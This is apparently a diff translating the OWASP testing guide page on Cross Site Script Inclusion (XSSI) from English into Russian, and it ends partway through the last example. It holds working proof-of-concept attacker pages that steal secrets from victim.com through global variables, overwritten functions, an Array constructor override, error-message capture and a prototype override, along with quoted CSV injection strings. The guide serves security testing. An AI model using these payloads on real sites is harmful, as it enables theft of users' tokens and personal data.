@@ -7,48 +7,48 @@ tags: WSTG
 ---
 
 {% include breadcrumb.html %}
-# Testing for Cross Site Script Inclusion
+# Тестирование включения межсайтовых скриптов (XSSI)
 
 |ID          |
 |------------|
 |WSTG-CLNT-13|
 
-## Summary
+## Обзор
 
-Cross Site Script Inclusion (XSSI) vulnerability allows sensitive data leakage across-origin or cross-domain boundaries. Sensitive data could include authentication-related data (login states, cookies, auth tokens, session IDs, etc.) or user's personal or sensitive personal data (email addresses, phone numbers, credit card details, social security numbers, etc.). XSSI is a client-side attack similar to Cross Site Request Forgery (CSRF) but has a different purpose. Where CSRF uses the authenticated user context to execute certain state-changing actions inside a victim’s page (e.g. transfer money to the attacker's account, modify privileges, reset password, etc.), XSSI instead uses JavaScript on the client-side to leak sensitive data from authenticated sessions.
+Уязвимость включения межсайтовых скриптов (англ.: Cross Site Script Inclusion, XSSI) делает возможной утечку чувствительных данных через границу источника (англ.: origin = URI scheme://host:port) или домена. Чувствительными данными могут быть данные, связанные с аутентификацией (статус входа в систему, cookie, токены аутентификации, идентификаторы сессий и т.д.) или персональные данные пользователя (адреса email, номера телефонов, данные банковской карты, номера счетов страхования, налоговые и т.д.). XSSI — это атака на стороне клиента, похожая на подделку межсайтовых запросов (CSRF), но имеющая другую цель. Если CSRF использует контекст аутентифицированного пользователя для выполнения определенных действий по изменению состояния на странице жертвы (например, перевода денег на счёт злоумышленника, повышения привилегий, сброса пароля и т.д.), то XSSI вместо этого использует JavaScript на стороне клиента для раскрытия конфиденциальных данных из аутентифицированных сессий.
 
-By default, websites are only allowed to access data if they are from the same origin. This is a key application security principle and governed by the same-origin policy (defined by [RFC 6454](https://tools.ietf.org/html/rfc6454)). An origin is defined as the combination of URI scheme (HTTP or HTTPS), host name, and port number. However, this policy is not applicable for HTML `<script>` tag inclusions. This exception is necessary, as without it websites would not be able to consume third party services, perform traffic analysis, or use advertisement platforms, etc.
+По умолчанию web-сайтам разрешён доступ к данным только в том случае, если они из одного и того же источника. Это ключевой принцип безопасности приложений, регулируемый политикой того же источника (определённой в [RFC 6454](https://tools.ietf.org/html/rfc6454)). Источник определяется там как комбинация схемы URI (HTTP или HTTPS), имени хоста и номера порта. Однако эта политика не применима к включениям HTML-тега `<script>`. Это исключение необходимо, так как без него web-сайты не смогли бы пользоваться сторонними сервисами, проводить анализ трафика, использовать рекламные платформы и т.д.
 
-When the browser opens a website with `<script>` tags, the resources are fetched from the cross-origin domain. The resources then run in the same context as the including site or browser, which presents the opportunity to leak sensitive data. In most cases, this is achieved using JavaScript, however, the script source doesn't have to be a JavaScript file with type `text/javascript` or `.js` extension.
+Когда браузер открывает web-сайт с тегами `<script>`, ресурсы могут извлекаться из другого источника или домена. С этого момента ресурсы интерпретируются в том же контексте, что и подключивший их сайт или браузер, что даёт возможность утечки чувствительных данных. В большинстве случаев это достигается с помощью JavaScript, однако источником скрипта не обязательно должен быть файл JavaScript с типом `text/javascript` или расширением `.js`.
 
-Older browser's vulnerabilities (IE9/10) allowed data leakage via JavaScript error messages at runtime, but those vulnerabilities have now been patched by vendors and are considered less relevant. By setting the charset attribute of the `<script>` tag, an attacker or tester can enforce UTF-16 encoding, allowing data leakage for other data formats (e.g. JSON) in some cases. For more on these attacks, see [Identifier based XSSI attacks](https://www.mbsd.jp/Whitepaper/xssi.pdf).
+Уязвимости старых браузеров (IE9/10) допускали утечку данных через сообщения об ошибках JavaScript во время выполнения, но теперь эти уязвимости исправлены и считаются менее актуальными. Установив у тега `<script>` атрибут `charset`, злоумышленник или тестировщик может применить кодировку UTF-16, что в некоторых случаях даёт утечку данных в других форматах данных (например, JSON). Подробнее об этих атаках см. [XSSI-атаки на основе идентификаторов](https://www.mbsd.jp/Whitepaper/xssi.pdf).
 
-## Test Objectives
+## Задачи тестирования
 
-- Locate sensitive data across the system.
-- Assess the leakage of sensitive data through various techniques.
+- Найти в системе чувствительные данные.
+- Оценить возможность их утечки с помощью различных методов.
 
-## How to Test
+## Как тестировать
 
-### Collect Data Using Authenticated and Unauthenticated User Sessions
+### Сбор информации с помощью аутентифицированных и неаутентифицированных сессий пользователей
 
-Identify which endpoints are responsible for sending sensitive data, what parameters are required, and identify all relevant dynamically and statically generated JavaScript responses using authenticated user sessions. Pay special attention to sensitive data sent using [JSONP](https://en.wikipedia.org/wiki/JSONP). To find dynamically generated JavaScript responses, generate authenticated and unauthenticated requests, then compare them. If they're different, it means the response is dynamic; otherwise it's static. To simplify this task, a tool such as [Veit Hailperin's Burp proxy plugin](https://github.com/luh2/DetectDynamicJS) can be used. Make sure to check other file types in addition to JavaScript; XSSI is not limited to JavaScript files alone.
+Узнайте, какие конечные точки отвечают за отправку чувствительных данных, какие параметры им требуются, и все соответствующие им динамически и статически сгенерированные ответы JavaScript через аутентифицированные сессии пользователя. Обратите особое внимание на чувствительные данные, передаваемые в [JSONP](https://ru.wikipedia.org/wiki/JSONP). Чтобы найти динамически сгенерированные ответы JavaScript, сгенерируйте аутентифицированные и неаутентифицированные запросы, а затем сравните их. Если они разные, это означает, что ответ динамический; в противном случае он статичен. Чтобы упростить эту задачу, можно использовать такой инструмент, как плагин [Veit Hailperin к Burp](https://github.com/luh2/DetectDynamicJS). Обязательно проверьте и другие типы файлов помимо JavaScript; XSSI не ограничивается только им.
 
-### Determine Whether the Sensitive Data Can Be Leaked Using JavaScript
+### Могут ли чувствительные данные быть раскрыты с помощью JavaScript?
 
-Testers should analyze code for the following vehicles for data leakage via XSSI vulnerabilities:
+Тестировщикам следует проанализировать на предмет утечки данных через XSSI-уязвимости код следующих сущностей:
 
-1. Global variables
-2. Global function parameters
-3. CSV (Comma Separated Values) with quotations theft
-4. JavaScript runtime errors
-5. Prototype chaining using `this`
+1. Глобальные переменные
+2. Глобальные параметры функций
+3. CSV (значения, разделённые запятыми) с "кражей цитат"
+4. Ошибки выполнения JavaScript
+5. Цепочка прототипов с `this`
 
-### 1. Sensitive Data Leakage via Global Variables
+### 1. Утечка чувствительных данных через глобальные переменные
 
-An API key is stored in a JavaScript file with the URI `https://victim.com/internal/api.js` on the victim's website, `victim.com`, which is only accessible to authenticated users. An attacker configures a website, `attackingwebsite.com`, and uses the `<script>` tag to refer to the JavaScript file.
+Ключ API хранится в файле JavaScript с URL `https://victim.com/internal/api.js` на сайте жертвы, `victim.com`, который доступен только для аутентифицированных пользователей. Злоумышленник контролирует сайт `attackingwebsite.com`, и использует тег `<script>` для ссылки на файл JavaScript.
 
-Here are the contents of `https://victim.com/internal/api.js`:
+Ниже код `https://victim.com/internal/api.js`:
 
 ```javascript
 (function() {
@@ -56,34 +56,34 @@ Here are the contents of `https://victim.com/internal/api.js`:
 })();
 ```
 
-The attack site, `attackingwebsite.com`, has an `index.html` with the following code:
+На сайте злоумышленника `attackingwebsite.com` размещается `index.html` со следующим кодом:
 
 ```html
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Leaking data via global variables</title>
+    <title>Утечка данных через глобальные переменные</title>
   </head>
   <body>
-    <h1>Leaking data via global variables</h1>
+    <h1>Утечка данных через глобальные переменные</h1>
     <script src="https://victim.com/internal/api.js"></script>
     <div id="result">
     </div>
     <script>
       var div = document.getElementById("result");
-      div.innerHTML = "Your secret data <b>" + window.secret + "</b>";
+      div.innerHTML = "Вот ваш секрет: <b>" + window.secret + "</b>";
     </script>
   </body>
 </html>
 ```
 
-In this example, a victim is authenticated with `victim.com`. An attacker lures the victim to `attackingwebsite.com` via social engineering, phishing emails, etc. The victim's browser then fetches `api.js`, resulting in the sensitive data being leaked via the global JavaScript variable and displayed using `innerHTML`.
+В этом примере жертва аутентифицируется на `victim.com`. Злоумышленник заманивает жертву на `attackingwebsite.com` посредством социальной инженерии, фишинговых писем и т.д. Затем браузер жертвы извлекает `api.js `, что приводит к утечке чувствительных данных через глобальную переменную JavaScript и их отображению с помощью `innerHTML`.
 
-### 2. Sensitive Data Leakage via Global Function Parameters
+### 2. Утечка чувствительных данных через глобальные параметры функций
 
-This example is similar to the previous one, except in this case `attackingwebsite.com` uses a global JavaScript function to extract the sensitive data by overwriting the victim's global JavaScript function.
+Этот пример похож на предыдущий, за исключением того, что на `attackingwebsite.com ` используется глобальная функция JavaScript для извлечения чувствительных данных путём перезаписи глобальной функции JavaScript жертвы.
 
-Here are the contents of `https://victim.com/internal/api.js`:
+Ниже код `https://victim.com/internal/api.js`:
 
 ```javascript
 (function() {
@@ -92,13 +92,13 @@ Here are the contents of `https://victim.com/internal/api.js`:
 })();
 ```
 
-The attack site, `attackingwebsite.com`, has an `index.html` with the following code:
+На сайте злоумышленника `attackingwebsite.com` размещается `index.html` со следующим кодом:
 
 ```html
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Leaking data via global function parameters</title>
+    <title>Утечка данных через глобальные параметры функций</title>
   </head>
   <body>
     <div id="result">
@@ -106,7 +106,7 @@ The attack site, `attackingwebsite.com`, has an `index.html` with the following 
     <script>
       function globalFunction(param) {
         var div = document.getElementById("result");
-        div.innerHTML = "Your secret data: <b>" + param + "</b>";
+        div.innerHTML = "Вот ваш секрет: <b>" + param + "</b>";
       }
     </script>
     <script src="https://victim.com/internal/api.js"></script>
@@ -114,13 +114,13 @@ The attack site, `attackingwebsite.com`, has an `index.html` with the following 
 </html>
 ```
 
-There are other XSSI vulnerabilities that can result in sensitive data leakage either via JavaScript prototype chains or global function calls. For more on these attacks, see [The Unexpected Dangers of Dynamic JavaScript](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf).
+Существуют и другие уязвимости XSSI, которые могут привести к утечке чувствительных данных либо через цепочки прототипов JavaScript, либо через глобальные вызовы функций. Подробнее об этих атаках см. [Неожиданные опасности динамического JavaScrip](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf).
 
-### 3. Sensitive Data Leakage via CSV with Quotations Theft
+### 3. Утечка чувствительных данных через CSV с "кражей цитат"
 
-To leak data the attacker/tester has to be able to inject JavaScript code into the CSV data. The following example code is an excerpt from Takeshi Terada's [Identifier based XSSI attacks](https://www.mbsd.jp/Whitepaper/xssi.pdf) whitepaper.
+Для утечки данных злоумышленник/тестировщик должен иметь возможность инъекции кода JavaScript в данные CSV. Следующий пример кода представляет собой выдержку из статьи Takeshi Terada [XSSI-атаки на основе идентификаторов](https://www.mbsd.jp/Whitepaper/xssi.pdf).
 
-```text
+```http
 HTTP/1.1 200 OK
 Content-Type: text/csv
 Content-Disposition: attachment; filename="a.csv"
@@ -133,7 +133,7 @@ Content-Length: xxxx
 99,"___","zzz@example.com","03-0000-0099"
 ```
 
-In this example, using the `___` columns as injection points and inserting JavaScript strings in their place has the following result.
+В этом примере столбцы `___`  в качестве точек для инъекции и вставка кода JavaScript вместо них приводит к следующему результату.
 
 ```text
 1,"\"",$$$=function(){/*","aaa@a.example","03-0000-0001"
@@ -143,18 +143,18 @@ In this example, using the `___` columns as injection points and inserting JavaS
 99,"*/}//","zzz@example.com","03-0000-0099"
 ```
 
-[Jeremiah Grossman wrote about a similar vulnerability in Gmail](https://blog.jeremiahgrossman.com/2006/01/advanced-web-attack-techniques-using.html) in 2006 that allowed the extraction of user contacts in JSON. In this case, the data was received from Gmail and parsed by the browser JavaScript engine using an unreferenced Array constructor to leak the data. An attacker could access this Array with the sensitive data by defining and overwriting the internal Array constructor like this:
+[Jeremiah Grossman писал об аналогичной уязвимости в Gmail](https://blog.jeremiahgrossman.com/2006/01/advanced-web-attack-techniques-using.html) в 2006 году, которая позволяла извлекать контакты пользователей в формате JSON. В этом случае данные были получены из Gmail и распарсены  движком JavaScript браузера с помощью конструктора массива без ссылок. Злоумышленник может получить доступ к этому массиву с чувствительными данными, определив и перезаписав внутренний конструктор массива следующим образом:
 
 ```html
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Leaking gmail contacts via JSON </title>
+    <title>Утечка контактов gmail через JSON</title>
   </head>
   <body>
     <script>
       function Array() {
-        // steal data
+        // крадём данные
       }
     </script>
     <script src="http://mail.google.com/mail/?_url_scrubbed_"></script>
@@ -162,11 +162,11 @@ In this example, using the `___` columns as injection points and inserting JavaS
 </html>
 ```
 
-### 4. Sensitive Data Leakage via JavaScript Runtime Errors
+### 4. Утечка чувствительных данных из-за ошибок во время выполнения JavaScript
 
-Browsers normally present standardized [JavaScript error messages](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors). However, in the case of IE9/10, runtime error messages provided additional details that could be used to leak data. For example, a website `victim.com` serves the following content at the URI `http://victim.com/service/csvendpoint` for authenticated users:
+Браузеры обычно выводят стандартизированные [сообщения об ошибках JavaScript](https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Errors). Однако в случае IE9/10 сообщения об ошибках во время выполнения содержали дополнительные сведения, которые могли быть использованы для утечки данных. Например, сайт `victim.com` предоставляет следующий контент по URL`http://victim.com/service/csvendpoint` для аутентифицированных пользователей:
 
-```text
+```http
 HTTP/1.1 200 OK
 Content-Type: text/csv
 Content-Disposition: attachment; filename="a.csv"
@@ -175,25 +175,25 @@ Content-Length: 13
 1,abc,def,ghi
 ```
 
-This vulnerability could be exploited with the following:
+Эта уязвимость может эксплуатироваться следующим образом:
 
 ```html
-<!--error handler -->
+<!--обработчик ошибок -->
 <script>window.onerror = function(err) {alert(err)}</script>
-<!--load target CSV -->
+<!--загрузить целевой CSV -->
 <script src="http://victim.com/service/csvendpoint"></script>
 ```
 
-When the browser tries to render the CSV content as JavaScript, it fails and leaks the sensitive data:
+Когда браузер пытается отобразить содержимое CSV в виде JavaScript, он терпит неудачу и происходит утечка чувствительных данных:
 
-![JavaScript runtime error message ](images/XSSI1.jpeg)\
-*Figure 4.11.13-1: JavaScript runtime error message*
+![JavaScript runtime error message](images/XSSI1.jpeg)\
+*Рисунок 4.11.13-1: Сообщение об ошибке во время выполнения JavaScript*
 
-### 5. Sensitive Data Leakage via Prototype Chaining Using `this`
+### 5. Утечка чувствительных данных через цепочку прототипов с `this`
 
-In JavaScript, the `this` keyword is dynamically scoped. This means if a function is called upon an object, `this` will point to this object even though the called function might not belong to the object itself. This behavior can be used to leak data. In the following example from [Sebastian Leike's demonstration page](http://sebastian-lekies.de/leak/), the sensitive data is stored in an Array. An attacker can override `Array.prototype.forEach` with an attacker-controlled function. If some code calls the `forEach` function on an array instance that contains sensitive values, the attacker-controlled function will be invoked with `this` pointing to the object that contains the sensitive data.
+В JavaScript ключевое слово `this` имеет динамическую область действия. Это означает, что если для объекта вызывается функция, `this` будет указывать на этот объект, даже если вызываемая функция не принадлежит самому объекту. Это поведение может эксплуатироваться для утечки данных. В следующем примере с [демонстрационной страницы Sebastian Leike](http://sebastian-lekies.de/leak/) чувствительные данные хранятся в массиве. Злоумышленник может переопределить `Array.prototype.forEach` с помощью функции, контролируемой злоумышленником. Если код вызывает функцию `forEach` для экземпляра массива, содержащего чувствительные значения, будет вызвана функция, контролируемая злоумышленником, с `this`, указывающим на объект, содержащий чувствительные данные.
 
-Here is an excerpt of a JavaScript file containing sensitive data, `javascript.js`:
+Вот отрывок из файла JavaScript, содержащего чувствительные данные, `javascript.js`:
 
 ```javascript
 ...
@@ -201,13 +201,13 @@ Here is an excerpt of a JavaScript file containing sensitive data, `javascript.j
   var secret = ["578a8c7c0d8f34f5", "345a8b7c9d8e34f5"];
 
   secret.forEach(function(element) {
-    // do something here
+    // здесь что-нибудь делаем
   });  
 })();
 ...
 ```
 
-The sensitive data can be leaked with the following JavaScript code:
+Чувствительные данные могут быть раскрыты с помощью следующего кода JavaScript:
 
 ```html
 ...
@@ -216,7 +216,7 @@ The sensitive data can be leaked with the following JavaScript code:
     </div>
     <script>
       Array.prototype.forEach = function(callback) {
-        var resultString = "Your secret values are: <b>";
+        var resultString = "Вот ваши секреты: <b>";
         for (var i = 0, length = this.length; i < length; i++) {
           if (i > 0) {
             resultString += ", ";
